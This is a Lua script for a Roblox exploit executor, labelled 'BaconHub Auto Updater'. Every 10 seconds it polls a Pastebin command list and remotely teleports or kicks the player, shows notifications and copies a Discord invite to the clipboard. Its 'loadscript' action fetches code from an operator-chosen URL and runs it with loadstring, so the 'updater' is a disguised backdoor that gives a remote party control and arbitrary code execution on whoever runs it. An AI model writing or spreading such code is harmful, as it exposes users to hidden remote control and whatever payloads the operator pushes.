-- 🟢 BaconHub Auto Updater (injects teleport + latest features)
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local PastebinURL = "https://pastebin.com/raw/SCbhHcVw" -- your command list

print("🔁 [BaconHub] Auto-updater running...")

spawn(function()
	while true do
		local success, result = pcall(function()
			return game:HttpGet(PastebinURL)
		end)

		if success then
			local commands = HttpService:JSONDecode(result)
			for _, cmd in pairs(commands) do
				if cmd.target == "all" or cmd.target == LocalPlayer.Name then
					
					if cmd.action == "teleport" then
						TeleportService:TeleportToPlaceInstance(cmd.placeId, cmd.jobId, LocalPlayer)

					elseif cmd.action == "message" then
						game.StarterGui:SetCore("SendNotification", {
							Title = "BaconHub",
							Text = cmd.text or "",
							Duration = 5
						})

					elseif cmd.action == "kick" then
						LocalPlayer:Kick(cmd.text or "You were kicked.")

					elseif cmd.action == "copyinvite" then
						if setclipboard then
							setclipboard(cmd.text)
							game.StarterGui:SetCore("SendNotification", {
								Title = "BaconHub",
								Text = "✅ Discord invite copied!\nOr search YouTube: bacon_hack769",
								Duration = 5
							})
						end

					elseif cmd.action == "loadscript" and cmd.url then
						local ok, scriptText = pcall(function()
							return game:HttpGet(cmd.url)
						end)
						if ok then
							local fn, err = loadstring(scriptText)
							if fn then
								fn()
							else
								warn("[BaconHub] Load error: "..err)
							end
						end
					end
				end
			end
		end
		wait(10)
	end
end)
